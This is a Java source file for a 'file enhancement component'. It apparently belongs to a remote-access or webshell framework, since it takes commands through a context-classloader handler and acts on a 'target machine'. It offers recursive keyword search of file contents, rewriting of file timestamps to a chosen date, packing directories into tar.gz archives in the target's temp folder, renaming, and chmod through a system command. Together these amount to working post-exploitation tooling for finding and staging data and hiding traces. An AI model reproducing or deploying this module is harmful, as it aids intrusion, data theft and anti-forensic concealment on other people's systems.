package org.leo.core.component;

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.GZIPOutputStream;

/**
 * 文件操作增强组件
 *
 * <p>提供三项增强能力：
 * <ul>
 *   <li>ACTION_GREP (1)  — 递归关键词搜索文件内容</li>
 *   <li>ACTION_TOUCH (2) — 修改文件/目录时间戳</li>
 *   <li>ACTION_PACK (3)  — 将目录打包为 tar.gz 并保存到目标机器临时路径</li>
 * </ul>
 *
 * <p>尽量使用低版本 JDK 语法和 API，避免生成匿名内部类。
 */
public class FileEnhanceComponent implements Runnable {

    private static final int ACTION_GREP   = 1;
    private static final int ACTION_TOUCH  = 2;
    private static final int ACTION_PACK   = 3;
    private static final int ACTION_RENAME = 4;
    private static final int ACTION_CHMOD  = 5;

    private HashMap params;
    private HashMap results;

    @Override

    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


    public void invoke() throws Exception {
        int action = toInt(params.get("action"), -1);
        switch (action) {
            case ACTION_GREP:   doGrep();   break;
            case ACTION_TOUCH:  doTouch();  break;
            case ACTION_PACK:   doPack();   break;
            case ACTION_RENAME: doRename(); break;
            case ACTION_CHMOD:  doChmod();  break;
            default:
                results.put("code", 400);
                results.put("msg", "未知 action: " + action);
        }
    }

    // ── GREP：递归内容搜索 ────────────────────────────────────────────────────

    private void doGrep() throws Exception {
        String rootPath  = getString("path");
        String keyword   = getString("keyword");
        boolean regex    = Boolean.TRUE.equals(params.get("regex"));
        boolean ignoreCase = !Boolean.FALSE.equals(params.get("ignoreCase")); // 默认忽略大小写
        int maxResults   = toInt(params.get("maxResults"), 200);
        int maxLineLen   = toInt(params.get("maxLineLen"), 300);
        String include   = getString("include"); // 文件名 glob，如 "*.java"

        if (rootPath == null || rootPath.isEmpty()) {
            results.put("code", 400); results.put("msg", "path 不能为空"); return;
        }
        if (keyword == null || keyword.isEmpty()) {
            results.put("code", 400); results.put("msg", "keyword 不能为空"); return;
        }

        File root = new File(rootPath);
        if (!root.exists()) {
            results.put("code", 404); results.put("msg", "路径不存在: " + rootPath); return;
        }

        Pattern pattern;
        try {
            String patternStr = regex ? keyword : Pattern.quote(keyword);
            pattern = ignoreCase
                ? Pattern.compile(patternStr, Pattern.CASE_INSENSITIVE)
                : Pattern.compile(patternStr);
        } catch (Exception e) {
            results.put("code", 400); results.put("msg", "正则表达式无效: " + e.getMessage()); return;
        }

        List matches = new ArrayList();
        int[] totalFiles = new int[] {0};
        int[] scannedFiles = new int[] {0};
        int[] remaining = new int[] {maxResults};

        grepRecursive(root, include, pattern, maxLineLen, matches, totalFiles, scannedFiles, remaining);

        results.put("code", 200);
        results.put("matches", matches);
        results.put("matchCount", matches.size());
        results.put("totalFiles", totalFiles[0]);
        results.put("scannedFiles", scannedFiles[0]);
        results.put("truncated", remaining[0] <= 0);
    }

    private void grepRecursive(File file, String include, Pattern pattern, int maxLineLen,
                               List matches, int[] totalFiles, int[] scannedFiles,
                               int[] remaining) {
        if (file == null || remaining[0] <= 0) {
            return;
        }
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children == null) {
                return;
            }
            Arrays.sort(children);
            for (int i = 0; i < children.length && remaining[0] > 0; i++) {
                grepRecursive(children[i], include, pattern, maxLineLen, matches,
                        totalFiles, scannedFiles, remaining);
            }
            return;
        }

        totalFiles[0]++;
        if (include != null && include.length() > 0 && !matchesGlob(file.getName(), include)) {
            return;
        }

        String name = file.getName().toLowerCase();
        if (isBinaryExtension(name)) {
            return;
        }

        if (file.length() > 10L * 1024L * 1024L) {
            return;
        }

        scannedFiles[0]++;
        List lineHits = new ArrayList();
        BufferedReader br = null;
        try {
            br = new BufferedReader(new InputStreamReader(new FileInputStream(file), "UTF-8"));
            String line;
            int lineNum = 0;
            while ((line = br.readLine()) != null && remaining[0] > 0) {
                lineNum++;
                Matcher m = pattern.matcher(line);
                if (m.find()) {
                    Map hit = new HashMap();
                    hit.put("line", String.valueOf(lineNum));
                    String content = line.length() > maxLineLen
                            ? line.substring(0, maxLineLen) + "..."
                            : line;
                    hit.put("content", content.trim());
                    lineHits.add(hit);
                    remaining[0]--;
                }
            }
        } catch (Exception ignored) {
        } finally {
            closeQuietly(br);
        }

        if (!lineHits.isEmpty()) {
            Map fileMatch = new HashMap();
            fileMatch.put("path", file.getAbsolutePath());
            fileMatch.put("hits", lineHits);
            fileMatch.put("hitCount", Integer.valueOf(lineHits.size()));
            matches.add(fileMatch);
        }
    }

    private boolean matchesGlob(String name, String glob) {
        if (glob == null || glob.length() == 0 || "*".equals(glob)) {
            return true;
        }
        StringBuffer regex = new StringBuffer();
        for (int i = 0; i < glob.length(); i++) {
            char ch = glob.charAt(i);
            if (ch == '*') {
                regex.append(".*");
            } else if (ch == '?') {
                regex.append('.');
            } else {
                if ("\\.[]{}()+-^$|".indexOf(ch) >= 0) {
                    regex.append('\\');
                }
                regex.append(ch);
            }
        }
        return Pattern.matches(regex.toString(), name);
    }

    private boolean isBinaryExtension(String name) {
        String[] binExts = {
            ".class",".jar",".war",".ear",".zip",".tar",".gz",".bz2",".xz",
            ".7z",".rar",".png",".jpg",".jpeg",".gif",".bmp",".ico",".svg",
            ".mp3",".mp4",".avi",".mov",".mkv",".pdf",".doc",".docx",".xls",
            ".xlsx",".ppt",".pptx",".exe",".dll",".so",".dylib",".bin",
            ".dat",".db",".sqlite",".lock",".pid"
        };
        for (String ext : binExts) {
            if (name.endsWith(ext)) return true;
        }
        return false;
    }

    // ── TOUCH：修改时间戳 ─────────────────────────────────────────────────────

    private void doTouch() throws Exception {
        String path      = getString("path");
        String timeStr   = getString("time");   // yyyy-MM-dd HH:mm:ss 或 null（使用当前时间）
        boolean recursive = Boolean.TRUE.equals(params.get("recursive"));

        if (path == null || path.isEmpty()) {
            results.put("code", 400); results.put("msg", "path 不能为空"); return;
        }

        File target = new File(path);
        if (!target.exists()) {
            results.put("code", 404); results.put("msg", "路径不存在: " + path); return;
        }

        long timestamp;
        if (timeStr != null && !timeStr.isEmpty()) {
            try {
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                timestamp = sdf.parse(timeStr).getTime();
            } catch (Exception e) {
                results.put("code", 400);
                results.put("msg", "时间格式错误，请使用 yyyy-MM-dd HH:mm:ss");
                return;
            }
        } else {
            timestamp = System.currentTimeMillis();
        }

        int count;

        if (recursive && target.isDirectory()) {
            count = touchRecursive(target, timestamp);
        } else {
            target.setLastModified(timestamp);
            count = 1;
        }

        results.put("code", 200);
        results.put("msg", "时间戳修改成功");
        results.put("modifiedCount", Integer.valueOf(count));
        results.put("newTime", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(timestamp)));
    }

    private int touchRecursive(File file, long timestamp) {
        int count = 0;
        if (file == null) {
            return 0;
        }
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (int i = 0; i < children.length; i++) {
                    count += touchRecursive(children[i], timestamp);
                }
            }
        }
        file.setLastModified(timestamp);
        return count + 1;
    }

    // ── PACK：打包目录为 tar.gz ───────────────────────────────────────────────

    private void doPack() throws Exception {
        String sourcePath = getString("path");
        String destPath   = getString("destPath"); // 可选，不传则用系统临时目录

        if (sourcePath == null || sourcePath.isEmpty()) {
            results.put("code", 400); results.put("msg", "path 不能为空"); return;
        }

        File source = new File(sourcePath);
        if (!source.exists()) {
            results.put("code", 404); results.put("msg", "路径不存在: " + sourcePath); return;
        }

        // 确定输出路径
        String archiveName = source.getName() + "_" + System.currentTimeMillis() + ".tar.gz";
        File destFile;
        if (destPath != null && !destPath.isEmpty()) {
            destFile = new File(destPath, archiveName);
        } else {
            destFile = new File(System.getProperty("java.io.tmpdir"), archiveName);
        }

        // 写 tar.gz（纯 Java 实现，不依赖外部命令）
        FileOutputStream fos = null;
        GZIPOutputStream gzos = null;
        try {
            fos = new FileOutputStream(destFile);
            gzos = new GZIPOutputStream(fos);
            writeTar(source, source.getParentFile(), gzos);
            gzos.finish();
        } finally {
            closeQuietly(gzos);
            closeQuietly(fos);
        }

        results.put("code", 200);
        results.put("msg", "打包成功");
        results.put("archivePath", destFile.getAbsolutePath());
        results.put("archiveName", archiveName);
        results.put("archiveSize", destFile.length());
    }

    /**
     * 简单 tar 实现（POSIX ustar 格式）。
     * 不依赖 Apache Commons Compress，兼容性更好。
     */
    private void writeTar(File file, File baseDir, OutputStream out) throws Exception {
        if (file.isDirectory()) {
            writeTarEntry(file, baseDir, out);
            File[] children = file.listFiles();
            if (children != null) {
                Arrays.sort(children);
                for (File child : children) {
                    writeTar(child, baseDir, out);
                }
            }
        } else {
            writeTarEntry(file, baseDir, out);
        }
    }

    private void writeTarEntry(File file, File baseDir, OutputStream out) throws Exception {
        String entryName = baseDir.toURI().relativize(file.toURI()).getPath();
        if (file.isDirectory() && !entryName.endsWith("/")) entryName += "/";

        byte[] header = buildTarHeader(entryName, file);
        out.write(header);

        if (!file.isDirectory()) {
            FileInputStream fis = null;
            try {
                fis = new FileInputStream(file);
                byte[] buf = new byte[512];
                int len;
                long written = 0;
                while ((len = fis.read(buf)) != -1) {
                    out.write(buf, 0, len);
                    written += len;
                }
                // 填充到 512 字节边界
                long remainder = written % 512;
                if (remainder != 0) {
                    out.write(new byte[(int)(512 - remainder)]);
                }
            } finally {
                closeQuietly(fis);
            }
        }
    }

    private byte[] buildTarHeader(String name, File file) throws Exception {
        byte[] header = new byte[512];
        Arrays.fill(header, (byte) 0);

        // name (100 bytes)
        byte[] nameBytes = name.getBytes("UTF-8");
        int nameLen = Math.min(nameBytes.length, 100);
        System.arraycopy(nameBytes, 0, header, 0, nameLen);

        // mode (8 bytes)
        fillOctal(header, 100, 8, file.isDirectory() ? 0755 : 0644);
        // uid/gid (8 bytes each)
        fillOctal(header, 108, 8, 0);
        fillOctal(header, 116, 8, 0);
        // size (12 bytes)
        fillOctal(header, 124, 12, file.isDirectory() ? 0 : file.length());
        // mtime (12 bytes)
        fillOctal(header, 136, 12, file.lastModified() / 1000);
        // checksum placeholder
        Arrays.fill(header, 148, 156, (byte) ' ');
        // typeflag
        header[156] = (byte)(file.isDirectory() ? '5' : '0');
        // magic "ustar"
        byte[] magic = "ustar  \0".getBytes("UTF-8");
        System.arraycopy(magic, 0, header, 257, Math.min(magic.length, 8));

        // compute checksum
        int checksum = 0;
        for (byte b : header) checksum += (b & 0xFF);
        fillOctal(header, 148, 7, checksum);
        header[155] = ' ';

        return header;
    }

    private void fillOctal(byte[] buf, int offset, int len, long value) throws Exception {
        String octal = String.format("%0" + (len - 1) + "o", value);
        byte[] bytes = octal.getBytes("UTF-8");
        int start = offset + (len - 1 - bytes.length);
        System.arraycopy(bytes, 0, buf, start, bytes.length);
    }

    // ── RENAME：重命名 ────────────────────────────────────────────────────────

    private void doRename() throws Exception {
        String path    = getString("path");
        String newName = getString("newName");

        if (path == null || path.isEmpty()) {
            results.put("code", 400); results.put("msg", "path 不能为空"); return;
        }
        if (newName == null || newName.isEmpty()) {
            results.put("code", 400); results.put("msg", "newName 不能为空"); return;
        }
        if (newName.contains("/") || newName.contains("\\") || newName.equals(".") || newName.equals("..")) {
            results.put("code", 400); results.put("msg", "newName 包含非法字符"); return;
        }

        File src = new File(path);
        if (!src.exists()) {
            results.put("code", 404); results.put("msg", "文件不存在: " + path); return;
        }

        File dest = new File(src.getParentFile(), newName);
        if (dest.exists()) {
            results.put("code", 409); results.put("msg", "目标名称已存在: " + newName); return;
        }

        boolean ok = src.renameTo(dest);
        if (!ok) {
            results.put("code", 500); results.put("msg", "重命名失败"); return;
        }

        results.put("code", 200);
        results.put("msg", "重命名成功");
        results.put("newPath", dest.getAbsolutePath());
    }

    // ── CHMOD：修改权限 ───────────────────────────────────────────────────────

    private void doChmod() throws Exception {
        String path      = getString("path");
        String mode      = getString("mode");     // 如 "755" 或 "0755"
        boolean recursive = Boolean.TRUE.equals(params.get("recursive"));

        if (path == null || path.isEmpty()) {
            results.put("code", 400); results.put("msg", "path 不能为空"); return;
        }
        if (mode == null || mode.isEmpty()) {
            results.put("code", 400); results.put("msg", "mode 不能为空"); return;
        }
        // 只允许 3-4 位八进制数字
        String modeClean = mode.replaceAll("^0+", "");
        if (!modeClean.matches("[0-7]{1,4}")) {
            results.put("code", 400); results.put("msg", "mode 格式错误，需为八进制数字如 755"); return;
        }

        File target = new File(path);
        if (!target.exists()) {
            results.put("code", 404); results.put("msg", "路径不存在: " + path); return;
        }

        // 尝试使用系统 chmod 命令（Linux/macOS）
        String[] cmd;
        if (recursive && target.isDirectory()) {
            cmd = new String[]{"chmod", "-R", modeClean, path};
        } else {
            cmd = new String[]{"chmod", modeClean, path};
        }

        Process proc = null;
        int exitCode;
        String errMsg = "";
        try {
            proc = Runtime.getRuntime().exec(cmd);
            // 读取 stderr 防止缓冲区阻塞
            InputStream errStream = proc.getErrorStream();
            byte[] errBuf = new byte[1024];
            int n = errStream.read(errBuf);
            if (n > 0) {
                errMsg = new String(errBuf, 0, n, "UTF-8").trim();
            }
            exitCode = proc.waitFor();
        } catch (Exception e) {
            // chmod 命令不可用（Windows），降级为 Java File API
            exitCode = applyChmodJava(target, modeClean, recursive) ? 0 : 1;
        } finally {
            if (proc != null) {
                try { proc.destroy(); } catch (Exception ignored) {}
            }
        }

        if (exitCode != 0) {
            results.put("code", 500);
            results.put("msg", "权限修改失败" + (errMsg.isEmpty() ? "" : ": " + errMsg));
            return;
        }

        results.put("code", 200);
        results.put("msg", "权限修改成功");
        results.put("mode", modeClean);
    }

    /**
     * 使用 Java File API 做有限的权限映射（Windows / 无 chmod 环境回退）。
     * 仅支持 owner 读/写/执行三位（取八进制 mode 最后三位的 owner 位）。
     */
    private boolean applyChmodJava(File target, String mode, boolean recursive) {
        int octal;
        try {
            octal = Integer.parseInt(mode, 8);
        } catch (Exception e) {
            return false;
        }
        int ownerBits = (octal >> 6) & 7;
        boolean r = (ownerBits & 4) != 0;
        boolean w = (ownerBits & 2) != 0;
        boolean x = (ownerBits & 1) != 0;
        applyBits(target, r, w, x);
        if (recursive && target.isDirectory()) {
            File[] children = target.listFiles();
            if (children != null) {
                for (int i = 0; i < children.length; i++) {
                    applyChmodJava(children[i], mode, true);
                }
            }
        }
        return true;
    }

    private void applyBits(File f, boolean r, boolean w, boolean x) {
        f.setReadable(r, false);
        f.setWritable(w, false);
        f.setExecutable(x, false);
    }

    // ── 工具方法 ──────────────────────────────────────────────────────────────

    private String getString(String key) {
        Object v = params.get(key);
        return v == null ? null : v.toString();
    }

    private int toInt(Object v, int def) {
        if (v == null) return def;
        try { return Integer.parseInt(v.toString()); } catch (Exception e) { return def; }
    }

    private void closeQuietly(Closeable closeable) {
        if (closeable == null) {
            return;
        }
        try {
            closeable.close();
        } catch (Exception ignored) {
        }
    }
}
